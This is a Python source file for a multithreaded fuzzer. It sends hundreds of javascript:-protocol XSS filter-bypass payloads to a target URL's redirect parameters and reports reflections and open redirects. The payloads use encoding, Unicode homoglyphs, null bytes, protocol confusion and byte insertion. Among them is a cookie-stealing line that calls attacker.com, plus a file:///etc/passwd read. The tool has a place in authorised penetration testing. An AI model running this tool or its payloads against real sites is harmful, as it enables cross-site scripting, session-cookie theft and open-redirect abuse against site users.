#!/usr/bin/env python3
"""
JavaScript Protocol Fuzzer
A comprehensive tool to test bypass techniques for javascript: protocol filtering

Usage:
    python3 javascript_protocol_fuzzer.py <target_url> [options]

Example:
    python3 javascript_protocol_fuzzer.py "https://example.com/index.html"
"""

import requests
import urllib.parse
import time
import sys
import argparse
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from colorama import init, Fore, Style
import json
import itertools
import string

# Initialize colorama for colored output
init(autoreset=True)

class JavaScriptProtocolFuzzer:
    def __init__(self, target_url, threads=10, delay=0.1, timeout=10):
        self.target_url = target_url
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.lock = threading.Lock()
        self.bypasses_found = []
        self.baseline_length = 0
        self.baseline_status = 0
        
        # Parse the target URL
        self.parsed_url = urlparse(target_url)
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{self.parsed_url.path}"
        self.original_params = parse_qs(self.parsed_url.query)
        
    def generate_recollapse_payloads(self, base_payloads=None, fuzz_bytes=None, encodings=None, max_size=1):
        """
        Generate Recollapse-style payloads by inserting, replacing, or normalizing bytes at every position
        in the base payload using various encodings.
        """
        if base_payloads is None:
            base_payloads = [
                "javascript:alert(1)",
                "javascript:confirm(1)",
                "javascript:prompt(1)",
            ]
        if fuzz_bytes is None:
            # Use a range of interesting bytes (non-alphanum, control, unicode)
            fuzz_bytes = list(range(0x00, 0x20)) + list(range(0x7F, 0xA0)) + [0x200B, 0x200C, 0x200D, 0xFEFF, 0x2060]
        if encodings is None:
            encodings = ['url', 'unicode', 'raw', 'double_url']

        recollapse_payloads = set()
        for base in base_payloads:
            for encoding in encodings:
                for size in range(1, max_size+1):
                    # Insert at every position
                    for pos in range(len(base)+1):
                        for t in itertools.product(fuzz_bytes, repeat=size):
                            a = base[:pos]
                            b = base[pos:]
                            x = ''
                            if encoding == 'url':
                                for byte in t:
                                    if byte > 0xff:
                                        x += urllib.parse.quote(chr(byte))
                                    else:
                                        x += f"%{hex(byte)[2:].zfill(2)}"
                                recollapse_payloads.add(f"{a}{x}{b}")
                            elif encoding == 'raw':
                                for byte in t:
                                    try:
                                        x += chr(byte)
                                    except Exception:
                                        continue
                                recollapse_payloads.add(f"{a}{x}{b}")
                            elif encoding == 'unicode':
                                for byte in t:
                                    x += f"\\u{hex(byte)[2:].zfill(4)}"
                                recollapse_payloads.add(f"{a}{x}{b}")
                            elif encoding == 'double_url':
                                for byte in t:
                                    if byte > 0xff:
                                        x += urllib.parse.quote(chr(byte))
                                    else:
                                        x += f"%{hex(byte)[2:].zfill(2)}"
                                recollapse_payloads.add(f"{a}{urllib.parse.quote(x)}{b}")
        return list(recollapse_payloads)

    def generate_payloads(self):
        """Generate all bypass payloads, including Recollapse-style advanced payloads and expert techniques"""
        payloads = []
        
        # Basic javascript: payloads
        basic_payloads = [
            "javascript:alert(1)",
            "javascript:alert('XSS')",
            "javascript:alert(document.cookie)",
            "javascript:fetch('https://attacker.com?cookie='+document.cookie)",
            "javascript:eval('alert(1)')",
            "javascript:confirm('XSS')",
            "javascript:prompt('XSS')"
        ]
        
        # Case variations
        case_variations = [
            "JaVaScRiPt:alert(1)",
            "jAvAsCrIpT:alert(1)",
            "JAVASCRIPT:alert(1)",
            "javascript:alert(1)",
            "javascript:alert(1)"
        ]
        
        # URL encoding variations
        encoding_variations = [
            "javascript%3Aalert(1)",
            "javascript%253Aalert(1)",
            "javascript%25253Aalert(1)",
            "javascript%2525253Aalert(1)",
            "javascript%25%33Aalert(1)",
            "javascript&#58;alert(1)",
            "javascript&#x3A;alert(1)",
            "javascript&#x003A;alert(1)"
        ]
        
        # Unicode normalization bypasses
        unicode_bypasses = [
            "javascript\u2028:alert(1)",  # Line separator
            "javascript\u2029:alert(1)",  # Paragraph separator
            "javascript\u200C:alert(1)",  # Zero-width non-joiner
            "javascript\u200B:alert(1)",  # Zero-width space
            "javascript\uFEFF:alert(1)",  # Zero-width no-break space
            "javascript\u200D:alert(1)",  # Zero-width joiner
            "javascript\u2060:alert(1)",  # Word joiner
            "javascript\u2061:alert(1)",  # Function application
            "javascript\u2062:alert(1)",  # Invisible times
            "javascript\u2063:alert(1)"   # Invisible separator
        ]
        
        # Null byte and control character injection
        null_byte_bypasses = [
            "javascript%00:alert(1)",
            "javascript%0A:alert(1)",
            "javascript%0D:alert(1)",
            "javascript%09:alert(1)",
            "javascript%1F:alert(1)",
            "javascript%7F:alert(1)",
            "javascript%0D%0A:alert(1)",
            "javascript%0A%0D:alert(1)"
        ]
        
        # Mixed case with Unicode
        mixed_unicode = [
            "jаvascript:alert(1)",  # Cyrillic 'a' (U+0430)
            "javаscript:alert(1)",  # Cyrillic 'a' (U+0430)
            "javaѕcript:alert(1)",  # Cyrillic 's' (U+0455)
            "javascrіpt:alert(1)",  # Cyrillic 'i' (U+0456)
            "javascrıpt:alert(1)",  # Dotless i (Turkish)
            "javascrіpt:alert(1)",  # Cyrillic 'i' (U+0456)
            "javascrіpt:alert(1)",  # Cyrillic 'i' (U+0456)
            "javascrіpt:alert(1)"   # Cyrillic 'i' (U+0456)
        ]
        
        # Mathematical Unicode characters
        math_unicode = [
            "javasc𝗿ipt:alert(1)",  # Mathematical bold 'r' (U+1D42F)
            "javasc𝚛ipt:alert(1)",  # Mathematical monospace 'r' (U+1D68B)
            "javasc𝓻ipt:alert(1)",  # Mathematical script 'r' (U+1D4BB)
            "javasc𝕣ipt:alert(1)",  # Mathematical double-struck 'r' (U+1D563)
            "javascri𝚙t:alert(1)",  # Mathematical monospace 'p' (U+1D693)
            "javascri𝓅t:alert(1)",  # Mathematical script 'p' (U+1D4C5)
            "javascri𝖕t:alert(1)",  # Mathematical bold fraktur 'p' (U+1D56D)
            "javascri𝑝t:alert(1)",  # Mathematical italic 'p' (U+1D45D)
            "javascri𝒑t:alert(1)",  # Mathematical bold script 'p' (U+1D4D1)
            "javascri𝓅𝓉:alert(1)"   # Both letters stylized
        ]
        
        # Alternative protocols
        alternative_protocols = [
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "vbscript:msgbox('XSS')",
            "vbscript:alert('XSS')",
            "file:///etc/passwd",
            "blob:javascript:alert(1)",
            "feed:javascript:alert(1)",
            "view-source:javascript:alert(1)",
            "about:javascript:alert(1)",
            "chrome:javascript:alert(1)",
            "opera:javascript:alert(1)",
            "ms-settings:javascript:alert(1)"
        ]
        
        # URL fragment and query tricks
        fragment_tricks = [
            "https://www.example.come#javascript:alert(1)",
            "https://www.example.com/#javascript:alert(1)",
            "https://www.example.com/?x=javascript:alert(1)",
            "https://www.example.com/%0Ajavascript:alert(1)",
            "https://www.example.com/%23javascript:alert(1)",
            "https://www.example.com/%3Fjavascript:alert(1)",
            "https://www.example.com/%26javascript:alert(1)"
        ]
        
        # Protocol confusion
        protocol_confusion = [
            "javascript:alert(1)//",
            "javascript:alert(1)/*",
            "javascript:alert(1)//",
            "javascript:alert(1)//",
            "javascript:alert(1)//",
            "/javascript:alert(1)",
            "//javascript:alert(1)",
            "///javascript:alert(1)",
            "..//javascript:alert(1)",
            "..\\javascript:alert(1)",
            "\\javascript:alert(1)"
        ]
        
        # Double/triple encoding with special characters
        double_encoding = [
            "javascript%3Aalert(1)",
            "javascript%253Aalert(1)",
            "javascript%25253Aalert(1)",
            "javascript%2525253Aalert(1)",
            "javascript%252525253Aalert(1)",
            "javascript%25%33Aalert(1)",
            "javascript%25%35%33Aalert(1)",
            "javascript%25%35%35%33Aalert(1)"
        ]
        
        # Combined techniques
        combined_bypasses = [
            "javascript\u200B:alert(1)",  # Unicode + basic
            "javascript%00:alert(1)",     # Null byte + basic
            "javascript%3Aalert(1)",      # Encoding + basic
            "javascript\u200B%3Aalert(1)", # Unicode + encoding
            "javascript%00\u200B:alert(1)", # Null byte + unicode
            "javascript\u200B%00:alert(1)", # Unicode + null byte
            "javascript%3A\u200Balert(1)", # Encoding + unicode
            "javascript\u200B%3A\u200Balert(1)" # Multiple unicode
        ]
        
        # Add expert/creative/server-side bypass payloads
        expert_payloads = [
            # Mixed encoding layers
            "javascript%25253Aalert(1)",
            "javascript%2525253Aalert(1)",
            "jav&#x61;script:alert(1)",
            "jav%61script:alert(1)",
            "jav\\u0061script:alert(1)",
            # Exotic Unicode and homoglyphs
            "jаvascript:alert(1)", # Cyrillic 'a'
            "javascrіpt:alert(1)", # Cyrillic 'i'
            "javascript\u200B:alert(1)",
            "java\u200Bscript:alert(1)",
            # Protocol smuggling
            "javascript://alert(1)",
            "javascript:////alert(1)",
            "javascript:alert(1)//",
            "/javascript:alert(1)",
            "..//javascript:alert(1)",
            "\\javascript:alert(1)",
            # Fragment and query tricks
            "https://site.com/#javascript:alert(1)",
            "?next=https://site.com/?q=javascript:alert(1)",
            # Case and separator confusion
            "JaVaScRiPt:alert(1)",
            "javascript:\talert(1)",
            "javascript:\nalert(1)",
            "javascript:\ralert(1)",
            # Path/host confusion
            "javascript://target.de/%0Aalert(1)",
            "javascript://user@evil.com:alert(1)",
            # Exotic HTML entities
            "javascript&#58;alert(1)",
            "javascript&#x3A;alert(1)",
            # Server-side only tricks
            "javascript:%C0%3Aalert(1)", # overlong encoding for ':'
            "javascri\u0301pt:alert(1)", # i + combining acute accent
            # Parameter pollution
            "?redirect=javascript:alert(1)&redirect=https://safe.com",
            "?redirect=https://safe.com&redirect=javascript:alert(1)",
            # Exotic browser/server quirks
            "javascript`alert(1)",
            "javascript:\u00A0alert(1)",
        ]
        
        # Add all payloads to the list
        all_payloads = (
            basic_payloads + case_variations + encoding_variations + 
            unicode_bypasses + null_byte_bypasses + mixed_unicode + 
            math_unicode + alternative_protocols + fragment_tricks + 
            protocol_confusion + double_encoding + combined_bypasses +
            expert_payloads
        )
        
        # Add Recollapse-style payloads
        recollapse_payloads = self.generate_recollapse_payloads()
        all_payloads.extend(recollapse_payloads)
        
        # Remove duplicates while preserving order
        seen = set()
        final_payloads = []
        for payload in all_payloads:
            if payload not in seen:
                seen.add(payload)
                final_payloads.append(payload)
        
        return final_payloads
    
    def test_payload(self, payload, param_name="LOFinishRedirect"):
        """Test a single payload"""
        try:
            # Create new parameters with the payload
            test_params = self.original_params.copy()
            test_params[param_name] = [payload]
            
            # Build the test URL
            test_url = f"{self.base_url}?{urlencode(test_params, doseq=True)}"
            
            # Make the request
            response = self.session.get(
                test_url, 
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # Check if bypass was successful
            bypass_detected = self.detect_bypass(response, payload)
            
            if bypass_detected:
                # Additional verification: check if this is a real bypass
                is_real_bypass = self.verify_real_bypass(response, payload)
                
                if is_real_bypass:
                    with self.lock:
                        self.bypasses_found.append({
                            'payload': payload,
                            'url': test_url,
                            'status_code': response.status_code,
                            'response_length': len(response.content),
                            'redirect_location': response.headers.get('Location', ''),
                            'content_type': response.headers.get('Content-Type', ''),
                            'verification': 'REAL_BYPASS'
                        })
                        print(f"{Fore.GREEN}[+] REAL BYPASS FOUND!{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}Payload: {payload}")
                        print(f"{Fore.YELLOW}URL: {test_url}")
                        print(f"{Fore.YELLOW}Status: {response.status_code}")
                        print(f"{Fore.YELLOW}Content-Length: {len(response.content)}")
                        if response.headers.get('Location'):
                            print(f"{Fore.YELLOW}Redirect: {response.headers['Location']}")
                        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.BLUE}[*] False positive detected for payload: {payload}{Style.RESET_ALL}")
            
            return bypass_detected
            
        except requests.exceptions.RequestException as e:
            with self.lock:
                print(f"{Fore.RED}[-] Error testing payload '{payload}': {e}{Style.RESET_ALL}")
            return False
    
    def detect_bypass(self, response, payload):
        """Detect if a bypass was successful"""
        try:
            # If we get a 403, it means the filter caught it - definitely not a bypass
            if response.status_code == 403:
                return False
            
            # If we get a 400, it means bad request - not a bypass
            if response.status_code == 400:
                return False
            
            # Check for redirects to malicious URLs
            if response.status_code in [301, 302, 307, 308]:
                location = response.headers.get('Location', '').lower()
                # If redirect location contains javascript: or alert(, it's a bypass
                if location and ('javascript:' in location or 'alert(' in location):
                    return True
                # If redirect is to a different domain, might be a bypass
                if location and not any(domain in location for domain in ['target.de', 'target.ai']):
                    return True
                # Normal redirects to same domain are not bypasses
                return False
            
            # For 200 responses, be extremely strict about what constitutes a bypass
            if response.status_code == 200:
                response_text = response.text.lower()
                payload_lower = payload.lower()
                
                # If response is similar to baseline, it's definitely not a bypass
                if abs(len(response.content) - self.baseline_length) < 1000:
                    return False
                
                # Only consider it a bypass if the payload is actually reflected AND in dangerous context
                if payload_lower in response_text:
                    # Must be in a dangerous context
                    if 'javascript:' in response_text or '<script' in response_text:
                        return True
                
                # Check if javascript: appears in response (real reflection)
                if 'javascript:' in response_text:
                    return True
                
                # Check if alert( appears in response (real reflection)
                if 'alert(' in response_text:
                    return True
                
                # Check if response contains script tags (real reflection)
                if '<script' in response_text:
                    return True
                
                # Default: not a bypass
                return False
            
            # For other status codes, be more conservative
            if response.status_code in [401, 500, 502, 503]:
                # These might indicate bypass attempts that caused errors
                return False
            
            # Default: not a bypass
            return False
            
        except Exception as e:
            return False
    
    def verify_real_bypass(self, response, payload):
        """Additional verification to ensure this is a real bypass, not a false positive"""
        try:
            # Check if this is just a normal page response (same as baseline)
            if response.status_code == self.baseline_status and abs(len(response.content) - self.baseline_length) < 100:
                return False
            
            # Check if this is just a normal page response
            if response.status_code == 200:
                response_text = response.text.lower()
                
                # If response contains normal page content, it's likely not a bypass
                normal_indicators = [
                    'html', 'head', 'body', 'title', 'meta', 'link', 'script',
                    'test', 'gateway', 'lti', 'learning', 'objects'
                ]
                
                normal_count = sum(1 for indicator in normal_indicators if indicator in response_text)
                if normal_count >= 2:  # More strict: if response looks like a normal page
                    return False
                
                # Additional check: if response length is similar to baseline, it's not a bypass
                if abs(len(response.content) - self.baseline_length) < 500:
                    return False
                
                # Check if payload is actually reflected in a meaningful way
                payload_lower = payload.lower()
                if payload_lower in response_text:
                    # Check if it's in a script tag or attribute
                    if '<script' in response_text or 'javascript:' in response_text:
                        return True
                    # Check if it's in an attribute that could execute
                    if 'href=' in response_text or 'src=' in response_text:
                        return True
                
                # Very short responses might indicate redirect
                # But only if significantly different from baseline
                if len(response.text) < 500 and abs(len(response.content) - self.baseline_length) > 1000:
                    return True
            
            # Check redirects
            elif response.status_code in [301, 302, 307, 308]:
                location = response.headers.get('Location', '').lower()
                if location:
                    # If redirect contains javascript:, it's definitely a bypass
                    if 'javascript:' in location:
                        return True
                    # If redirect is to external domain, might be bypass
                    if not any(domain in location for domain in ['target.de', 'target.ai']):
                        return True
            
            return False
            
        except Exception as e:
            return False
    
    def test_parameter_names(self, payload):
        """Test the payload with different parameter names"""
        param_names = [
            "redirect", "url", "target", "dest", "destination", "goto", "link",
            "href", "src", "action", "formaction", "data", "value", "input",
            "anything", "test", "param", "query", "search", "q", "id", "ref"
        ]
        
        for param_name in param_names:
            if self.test_payload(payload, param_name):
                return True
        return False
    
    def run_fuzzer(self):
        """Run the main fuzzing process"""
        print(f"{Fore.CYAN}[*] Starting JavaScript Protocol Fuzzer{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target: {self.target_url}")
        print(f"{Fore.CYAN}[*] Threads: {self.threads}")
        print(f"{Fore.CYAN}[*] Delay: {self.delay}s")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        # First, establish baseline response
        print(f"{Fore.BLUE}[*] Establishing baseline response...{Style.RESET_ALL}")
        baseline_response = self.session.get(self.target_url, timeout=self.timeout, allow_redirects=False)
        self.baseline_length = len(baseline_response.content)
        self.baseline_status = baseline_response.status_code
        print(f"{Fore.BLUE}[*] Baseline - Status: {self.baseline_status}, Length: {self.baseline_length}{Style.RESET_ALL}")
        
        # Generate all payloads
        payloads = self.generate_payloads()
        print(f"{Fore.BLUE}[*] Generated {len(payloads)} payloads to test{Style.RESET_ALL}")
        
        # Test with ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit all payloads
            future_to_payload = {
                executor.submit(self.test_parameter_names, payload): payload 
                for payload in payloads
            }
            
            # Process completed tasks
            for future in as_completed(future_to_payload):
                payload = future_to_payload[future]
                try:
                    result = future.result()
                    if result:
                        print(f"{Fore.GREEN}[+] Potential bypass found with payload: {payload}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error processing payload '{payload}': {e}{Style.RESET_ALL}")
                
                # Add delay between requests
                time.sleep(self.delay)
        
        # Print summary
        self.print_summary()
    
    def print_summary(self):
        """Print the final summary"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] FUZZING COMPLETED{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        if self.bypasses_found:
            print(f"{Fore.GREEN}[+] Found {len(self.bypasses_found)} potential bypasses:{Style.RESET_ALL}")
            for i, bypass in enumerate(self.bypasses_found, 1):
                print(f"\n{Fore.GREEN}[{i}] Bypass Details:{Style.RESET_ALL}")
                print(f"  Payload: {bypass['payload']}")
                print(f"  URL: {bypass['url']}")
                print(f"  Status Code: {bypass['status_code']}")
                print(f"  Response Length: {bypass['response_length']}")
                if bypass['redirect_location']:
                    print(f"  Redirect: {bypass['redirect_location']}")
                if bypass['content_type']:
                    print(f"  Content-Type: {bypass['content_type']}")
            
            # Save results to file
            self.save_results()
        else:
            print(f"{Fore.YELLOW}[!] No bypasses found. The server-side validation appears to be robust.{Style.RESET_ALL}")
    
    def save_results(self):
        """Save results to a JSON file"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"javascript_bypass_results_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump({
                'target_url': self.target_url,
                'timestamp': timestamp,
                'bypasses_found': self.bypasses_found
            }, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Results saved to: {filename}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(
        description="JavaScript Protocol Fuzzer - Test bypass techniques for javascript: protocol filtering",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 javascript_protocol_fuzzer.py "https://example.com/page?param=value"
  python3 javascript_protocol_fuzzer.py "https://example.com/page" --threads 20 --delay 0.05
  python3 javascript_protocol_fuzzer.py "https://example.com/page" --timeout 15
        """
    )
    
    parser.add_argument("target_url", help="Target URL to test")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between requests in seconds (default: 0.1)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.target_url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[-] Error: URL must start with http:// or https://{Style.RESET_ALL}")
        sys.exit(1)
    
    try:
        # Create and run the fuzzer
        fuzzer = JavaScriptProtocolFuzzer(
            target_url=args.target_url,
            threads=args.threads,
            delay=args.delay,
            timeout=args.timeout
        )
        
        fuzzer.run_fuzzer()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Fuzzing interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main() 
